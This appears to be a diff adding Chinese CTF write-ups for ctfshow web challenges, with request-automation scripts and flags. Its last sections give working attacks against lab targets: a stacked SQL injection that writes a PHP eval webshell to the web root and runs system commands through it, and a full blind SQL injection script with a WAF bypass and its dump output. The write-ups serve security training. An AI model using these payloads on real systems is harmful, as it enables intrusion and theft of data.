@@ -4068,7 +4068,115 @@ array(24) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(10) ".dockeren
 
 ## CTFSHOW
 
-### [七夕杯web签到](https://www.ctf.show/challenges#web%E7%AD%BE%E5%88%B0-3767)
+### 神仙姐姐
+
+进入靶机后看到以下内容：
+
+```
+【ctfshow闯关剧情】 段誉看着石像，跪下便即发觉，原来玉像前本有两个蒲团，似是供人跪拜之用，他双膝跪着的是个较大蒲团，玉像足前另有一较小蒲团，想是让人磕头用的。他一个头磕下去，只见玉像双脚的鞋子内侧似乎绣得有字。凝目看去，认出右足鞋上绣的是“磕首千遍，供我驱策”八字，左足鞋上绣的是“遵行我命，百死无悔”八个字。
+你已经拜了0次
+```
+
+有个按钮“拜”，点一下就能加一次，貌似需要拜一千次才能拿到`flag`。
+
+用`Burp Suite`抓包发现按钮“拜”请求的链接是`/sx.php`，拿到`PHPSESSID`后，编写`Python`代码求解。
+
+```python
+import requests
+import json
+
+url = "http://6d2fd070-5666-4ee3-93ec-7c6785a6f590.challenge.ctf.show/sx.php"
+cookies = {'PHPSESSID':'5kou9mmciqef9dbtrpb6otq976'}
+for i in range(1000):
+    r = requests.get(url, cookies=cookies)
+    print(r.text)
+    data = json.loads(r.text)
+    if "j0ke" in r.text: # "ctfsh0w-f1ag-n0t-h3r3-th1s-msg-just-a-j0ke-}{"
+        print(f"num值是: {data['num']}")
+    else:  # ctfshow in r.text
+        print(f"flag值是：{data['flag']}")
+        break
+```
+
+代码运行结果如下，用不着遍历1000次就能突然冒出来一个真的`flag`。
+
+```
+{"code":0,"num":1,"flag":"ctfsh0w-f1ag-n0t-h3r3-th1s-msg-just-a-j0ke-}{"}
+num值是: 1
+......
+{"code":0,"num":382,"flag":"ctfsh0w-f1ag-n0t-h3r3-th1s-msg-just-a-j0ke-}{"}
+num值是: 382
+{"code":0,"num":383,"flag":"ctfshow{7cb3de57-04f2-49bd-a5d4-959f5cfdc349}"}
+flag值是：ctfshow{7cb3de57-04f2-49bd-a5d4-959f5cfdc349}
+```
+
+提交`ctfshow{7cb3de57-04f2-49bd-a5d4-959f5cfdc349}`即可。
+
+------
+
+### 阿拉丁
+
+进入靶机后看到一个输入框，提示文字是“请输入你的愿望”。
+
+当我们输入“flag”时，显示内容为“你重新想个愿望吧”。好，那就重新想个愿望。如果不那么贪心呢？
+
+当我们输入“flag的第1位？”，显示内容为“flag第1位是c”。依此类推，阿拉丁会告诉我们`flag`的每一位。
+
+编写`Python`代码求解。如果不`break`的话，会看到一个彩蛋“flag没有你那么长~”。
+
+```python
+import requests
+
+url = "http://104d2c5c-2417-45ed-8166-d09131b227e2.challenge.ctf.show/"
+session = requests.Session()
+flag = ''
+for i in range(1, 50):
+    wish = f"flag的第{i}位？"
+    response = session.post(url, data={"wish":wish})
+    if response.status_code == 200:
+        print(response.text)
+        ch = response.text[-1]
+        flag += ch
+        if ch == '}':
+            break
+print(flag)
+```
+
+提交`ctfshow{455fadb2-ea6e-4f39-98ef-f38b1c37658f}`即可。
+
+------
+
+### 迷
+
+题目描述给了这个表情包，记住这个表情包哈。
+
+![](https://ctf.show/files/876ea46efe112bd1f8594bf45e49eb80/2.jpg)
+
+进入靶机后，看到一个登录框，尝试`sqlmap`爆破未果。
+
+访问`/flag`，可以看到一行文字：`是____蒙蔽了我的双眼`。
+
+访问`/菜`，即`/%E8%8F%9C`，可以拿到`flag`。
+
+提交`ctfshow{aebf85b0-30e6-466e-8514-39478c447ed5}`即可。
+
+------
+
+### 飘啊飘
+
+> 有手X就行
+
+这道题如果直接用电脑打开看到很多枫叶在飘，缓缓飘落的枫叶🍁像思念。
+
+如果`F12`后按`Ctrl+Shift+M`的话会显示重定向次数过多，清理缓存。
+
+这道题的做法其实很简单...伪装请求头`User-Agent: Android`，状态码302重定向到`mb.html`。我们使用`HackBar`或`ModHeader`修改`User-Agent`值为`Android`访问靶机，即可重定向到`mb.html`得到`flag`。
+
+提交`ctfshow{517719bf-4224-4043-80be-c88b862b21c8}`即可。
+
+------
+
+### 七夕杯web签到
 
 靶机支持短命令执行但不会回显，审计代码发现关键函数`isSafe()`。
 
@@ -4079,7 +4187,7 @@ function isSafe(cmd)
 }
 ```
 
-`ctfshow{26c5c506-d5b9-4fa8-8916-dff74381d313}`
+编写`Python`代码求解。
 
 ```python
 import requests
@@ -4097,6 +4205,8 @@ if response.status_code == 200:
 else:
     print('error')
 ```
+
+提交`ctfshow{26c5c506-d5b9-4fa8-8916-dff74381d313}`即可。
 
 ------
 
@@ -5848,6 +5958,216 @@ CTF{bool_sql_injection_is_fun}
 ```
 
 提交`CTF{bool_sql_injection_is_fun}`即可。
+
+------
+
+### 堆叠注入写Shell
+
+根据题意，我们需要使用堆叠注入写入一句话木马，先用`Python`将一句话木马编码成十六进制字符串。
+
+```python
+>>> b'<?php eval($_POST[1]);?>'.hex()
+'3c3f706870206576616c28245f504f53545b315d293b3f3e'
+>>> bytes.fromhex('3c3f706870206576616c28245f504f53545b315d293b3f3e')
+b'<?php eval($_POST[1]);?>'
+```
+
+用`HackBar`构造`POST`请求，对靶机的`/login.php`发送以下数据。由于靶机过滤了单引号无法直接闭合，所以需要使用使用转义符绕过单引号限制。
+
+```
+password=;select 0x3c3f706870206576616c28245f504f53545b315d293b3f3e into outfile "/var/www/html/1.php";%23 &username=admin\
+```
+
+将以上数据通过`POST`请求方式发送到`login.php`后，访问`/1.php`发现成功写入一句话木马。
+
+用`HackBar`构造`POST`请求访问`/1.php`，用`1=system('ls /');`或`1=var_dump(scandir('/'));`查看靶机根目录文件。
+
+```
+bin dev etc flag.txt home lib media mnt opt proc root run sbin srv sys tmp usr var
+```
+
+用`1=system('tac /f*');`查看`/flag.txt`文件内容。
+
+提交`CTF{sql_injection_is_fun}`即可。
+
+------
+
+### WAF绕过
+
+靶机过滤了空格，可以用注释绕过。编写`Python`代码绕过WAF进行`SQL`注入。
+
+```python
+import requests
+import string
+
+URL = "http://a9ea6c58-6683-49e5-9c17-23bd661508b9.challenge.ctf.show/login.php"
+FAIL = "script" # 登录失败时的响应头
+
+def send_payload(payload):
+    payload = payload.replace(" ", "/*!*/")  # 绕过空格过滤
+    data = {
+        "username": payload,
+        "password": "anything"
+    }
+    resp = requests.post(URL, data=data, allow_redirects=False)
+    return resp.text.find(FAIL) == -1
+
+def get_length(payload_template, min_len=1, max_len=100):
+    for l in range(min_len, max_len):
+        payload = payload_template.format(l)
+        if send_payload(payload):
+            return l
+    return None
+
+def get_string(payload_template, length):
+    result = ""
+    chars = string.ascii_letters + string.digits + "_{}@.-,! "
+    for i in range(1, length+1):
+        for c in chars:
+            payload = payload_template.format(i, c)
+            if send_payload(payload):
+                result += c
+                print(f"\r{result}", end="", flush=True)
+                break
+    print()
+    return result
+
+def get_table_names():
+    print("[*] Getting table name length...")
+    length = get_length("admin' and (select length(group_concat(table_name)) from information_schema.tables where table_schema=database())={};#---")
+    print(f"[*] Table names length: {length}")
+    print("[*] Getting table names...")
+    names = get_string("admin' and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1))=ascii('{}');#---", length)
+    print(f"[*] Table names: {names.split(',')}")
+    return names.split(',')
+
+def get_column_names(table):
+    print(f"[*] Getting column names length for {table}...")
+    length = get_length(f"admin' and (select length(group_concat(column_name)) from information_schema.columns where table_name='{table}')={{}};#---")
+    print(f"[*] Column names length: {length}")
+    print(f"[*] Getting column names for {table}...")
+    names = get_string(f"admin' and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='{table}'),{{}},1))=ascii('{{}}');#---", length)
+    print(f"[*] Column names: {names}")
+    return names.split(',')
+
+def get_field(table, column, row=0):
+    print(f"[*] Getting length of {column} in {table} row {row}...")
+    length = get_length(f"admin' and (select length({column}) from {table} limit {row},1)={{}};#---", max_len=256)
+    print(f"[*] Field length: {length}")
+    if length is None:
+        print(f"[!] Cannot determine length for {column} in {table} row {row}, skipping.")
+        return ""
+
+    print(f"[*] Getting value of {column} in {table} row {row}...")
+    value = get_string(f"admin' and ascii(substr((select {column} from {table} limit {row},1),{{}},1))=ascii('{{}}');#---", length)
+    print(f"[*] Value: {value}")
+    return value
+
+if __name__ == "__main__":
+    # 1. 获取所有表名
+    tables = get_table_names()
+    # 2. 获取每个表的列名
+    for table in tables:
+        columns = get_column_names(table)
+        # 3. 获取每个表的每个字段内容
+        for col in columns:
+            for row in range(2):
+                get_field(table, col, row)
+```
+
+代码运行结果如下：
+
+```
+[*] Getting table name length...
+[*] Table names length: 11
+[*] Getting table names...
+pages,users
+[*] Table names: ['pages', 'users']
+[*] Getting column names length for pages...
+[*] Column names length: 16
+[*] Getting column names for pages...
+id,title,content
+[*] Column names: id,title,content
+[*] Getting length of id in pages row 0...
+[*] Field length: 1
+[*] Getting value of id in pages row 0...
+1
+[*] Value: 1
+[*] Getting length of id in pages row 1...
+[*] Field length: 1
+[*] Getting value of id in pages row 1...
+2
+[*] Value: 2
+[*] Getting length of title in pages row 0...
+[*] Field length: 7
+[*] Getting value of title in pages row 0...
+Welcome
+[*] Value: Welcome
+[*] Getting length of title in pages row 1...
+[*] Field length: 5
+[*] Getting value of title in pages row 1...
+About
+[*] Value: About
+[*] Getting length of content in pages row 0...
+[*] Field length: 37
+[*] Getting value of content in pages row 0...
+WelcometotheCTFtrainingplatform!
+[*] Value: WelcometotheCTFtrainingplatform!
+[*] Getting length of content in pages row 1...
+[*] Field length: 43
+[*] Getting value of content in pages row 1...
+ThisisaplatformfortrainingCTFskills.
+[*] Value: ThisisaplatformfortrainingCTFskills.
+[*] Getting column names length for users...
+[*] Column names length: 63
+[*] Getting column names for users...
+USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password
+[*] Column names: USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password
+[*] Getting length of USER in users row 0...
+[*] Field length: None
+[!] Cannot determine length for USER in users row 0, skipping.
+[*] Getting length of USER in users row 1...
+[*] Field length: None
+[!] Cannot determine length for USER in users row 1, skipping.
+[*] Getting length of CURRENT_CONNECTIONS in users row 0...
+[*] Field length: None
+[!] Cannot determine length for CURRENT_CONNECTIONS in users row 0, skipping.
+[*] Getting length of CURRENT_CONNECTIONS in users row 1...
+[*] Field length: None
+[!] Cannot determine length for CURRENT_CONNECTIONS in users row 1, skipping.
+[*] Getting length of TOTAL_CONNECTIONS in users row 0...
+[*] Field length: None
+[!] Cannot determine length for TOTAL_CONNECTIONS in users row 0, skipping.
+[*] Getting length of TOTAL_CONNECTIONS in users row 1...
+[*] Field length: None
+[!] Cannot determine length for TOTAL_CONNECTIONS in users row 1, skipping.
+[*] Getting length of id in users row 0...
+[*] Field length: 1
+[*] Getting value of id in users row 0...
+1
+[*] Value: 1
+[*] Getting length of id in users row 1...
+[*] Field length: None
+[!] Cannot determine length for id in users row 1, skipping.
+[*] Getting length of username in users row 0...
+[*] Field length: 5
+[*] Getting value of username in users row 0...
+admin
+[*] Value: admin
+[*] Getting length of username in users row 1...
+[*] Field length: None
+[!] Cannot determine length for username in users row 1, skipping.
+[*] Getting length of password in users row 0...
+[*] Field length: 37
+[*] Getting value of password in users row 0...
+CTF{bool_sql_injection_bypass_is_fun}
+[*] Value: CTF{bool_sql_injection_bypass_is_fun}
+[*] Getting length of password in users row 1...
+[*] Field length: None
+[!] Cannot determine length for password in users row 1, skipping.
+```
+
+提交`CTF{bool_sql_injection_bypass_is_fun}`即可。
 
 ------
 
